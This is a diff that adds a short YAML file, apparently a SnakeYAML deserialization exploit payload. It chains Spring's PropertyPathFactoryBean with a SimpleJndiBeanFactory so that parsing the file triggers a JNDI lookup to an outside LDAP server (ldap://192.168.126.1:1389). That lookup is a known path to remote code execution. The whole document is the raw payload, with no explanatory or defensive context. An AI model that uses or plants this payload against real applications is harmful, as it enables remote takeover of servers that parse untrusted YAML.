@@ -1,0 +1,4 @@
+!<tag:yaml.org,2002:org.springframework.beans.factory.config.PropertyPathFactoryBean> 
+{targetBeanName: "ldap://192.168.126.1:1389/fwxq1h",
+propertyPath: Drunkbaby, 
+beanFactory: !<tag:yaml.org,2002:org.springframework.jndi.support.SimpleJndiBeanFactory> {shareableResources: ["ldap://192.168.126.1:1389/fwxq1h"]}}
